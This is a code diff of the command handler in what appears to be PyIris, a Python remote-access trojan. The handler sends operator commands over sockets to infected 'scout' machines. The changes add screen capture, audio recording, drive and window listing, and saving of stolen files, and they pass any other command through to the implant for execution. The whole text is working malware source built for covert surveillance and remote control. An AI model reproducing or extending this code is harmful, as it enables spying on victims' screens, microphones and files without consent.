@@ -19,10 +19,6 @@ def Pyiris_handler(id):
             command = command_input.split(' ')[0]
             if command == 'banner':
                 display_banner()
-            elif command == 'help':
-                cfg.db_scouts[id][5].sendall(command_input + End)
-                output = recvall(cfg.db_scouts[id][5])
-                print output
             elif command == 'quit':
                 cleanup()
             elif command == 'clear':
@@ -49,21 +45,16 @@ def Pyiris_handler(id):
                 if '[*]' in output:
                     cfg.db_scouts.pop(id)
                     break
-            elif command == 'exec':
-                cfg.db_scouts[id][5].sendall(command_input + End)
-                output = recvall(cfg.db_scouts[id][5])
-                print output
-            elif command == 'exec_file':
-                cfg.db_scouts[id][5].sendall(command_input + End)
-                output = recvall(cfg.db_scouts[id][5])
-                print output
-            elif command == 'toggle':
-                cfg.db_scouts[id][5].sendall(command_input + End)
-                output = recvall(cfg.db_scouts[id][5])
-                print output
             elif command == 'download':
                 cfg.db_scouts[id][5].sendall(command_input + End)
-                output = recvall(cfg.db_scouts[id][5])
+                cfg.db_scouts[id][5].settimeout(3)
+                output = ''
+                while True:
+                    try:
+                        data = cfg.db_scouts[id][5].recv(9999)
+                        output += data
+                    except socket.timeout:
+                        break
                 if '|/' in output:
                     output = output.split('|/', 1)
                     f = open(basename(output[0]), 'wb')
@@ -87,27 +78,6 @@ def Pyiris_handler(id):
                     print output
                 else:
                     print cfg.err + 'File path/name is not valid'
-            elif command == 'dump':
-                cfg.db_scouts[id][5].sendall(command_input + End)
-                output = recvall(cfg.db_scouts[id][5])
-                print cfg.note + 'Dumped contents :\n'
-                print output
-            elif command == 'web_download':
-                cfg.db_scouts[id][5].sendall(command_input + End)
-                output = recvall(cfg.db_scouts[id][5])
-                print output
-            elif command == 'ty':
-                cfg.db_scouts[id][5].sendall(command_input + End)
-                output = recvall(cfg.db_scouts[id][5])
-                print output
-            elif command == 'pr':
-                cfg.db_scouts[id][5].sendall(command_input + End)
-                output = recvall(cfg.db_scouts[id][5])
-                print output
-            elif command == 'sh':
-                cfg.db_scouts[id][5].sendall(command_input + End)
-                output = recvall(cfg.db_scouts[id][5])
-                print output
             elif command == 'valids':
                 cfg.db_scouts[id][5].sendall(command_input + End)
                 output = recvall(cfg.db_scouts[id][5])
@@ -115,46 +85,55 @@ def Pyiris_handler(id):
                     load_output = output.split('|/')
                     for i in load_output:
                         print cfg.note + i
-            elif command == 'clip_clear':
+            elif command == 'active':
                 cfg.db_scouts[id][5].sendall(command_input + End)
                 output = recvall(cfg.db_scouts[id][5])
-                print output
-            elif command == 'clip_dump':
+                if '|/' in output:
+                    output = output.split('|/')
+                    for i in output:
+                        if not i:
+                            continue
+                        print cfg.pos + i
+                else:
+                    print output
+            elif command == 'drives':
                 cfg.db_scouts[id][5].sendall(command_input + End)
                 output = recvall(cfg.db_scouts[id][5])
-                print output
-            elif command == 'clip_set':
+                if '|/' in output:
+                    output = output.split('|/')
+                    for i in output:
+                        print cfg.pos + i
+                else:
+                    print output
+            elif command == 'screen':
                 cfg.db_scouts[id][5].sendall(command_input + End)
                 output = recvall(cfg.db_scouts[id][5])
-                print output
-            elif command == 'click_left':
+                if '|/' in output:
+                    output = output.split('|/', 1)
+                    f = open(basename(output[0]), 'wb')
+                    f.write(output[1])
+                    f.close()
+                    print cfg.pos + 'Downloaded scouts screenshot as : ' + basename(output[0])
+                else:
+                    print output
+            elif command == 'rec_audio':
                 cfg.db_scouts[id][5].sendall(command_input + End)
+                print cfg.pos + 'Recording, please be patient '
                 output = recvall(cfg.db_scouts[id][5])
-                print output
-            elif command == 'click_right':
-                cfg.db_scouts[id][5].sendall(command_input + End)
-                output = recvall(cfg.db_scouts[id][5])
-                print output
-            elif command == 'move_to':
-                cfg.db_scouts[id][5].sendall(command_input + End)
-                output = recvall(cfg.db_scouts[id][5])
-                print output
-            elif command == 'dimensions':
-                cfg.db_scouts[id][5].sendall(command_input + End)
-                output = recvall(cfg.db_scouts[id][5])
-                print output
-            elif command == 'position':
-                cfg.db_scouts[id][5].sendall(command_input + End)
-                output = recvall(cfg.db_scouts[id][5])
-                print output
-            elif command == 'swap':
-                cfg.db_scouts[id][5].sendall(command_input + End)
-                output = recvall(cfg.db_scouts[id][5])
-                print output
+                if '|/' in output:
+                    output = output.split('|/', 1)
+                    f = open(basename(output[0]), 'wb')
+                    f.write(output[1])
+                    f.close()
+                    print cfg.pos + 'Downloaded scouts audio recording as : ' + basename(output[0])
+                else:
+                    print output
             elif command == '':
                 pass
             else:
-                print cfg.err + 'Unknown command "' + command + '", run "help" for help menu'
+                cfg.db_scouts[id][5].sendall(command_input + End)
+                output = recvall(cfg.db_scouts[id][5])
+                print output
         except EOFError:
             try:
                 time.sleep(3)
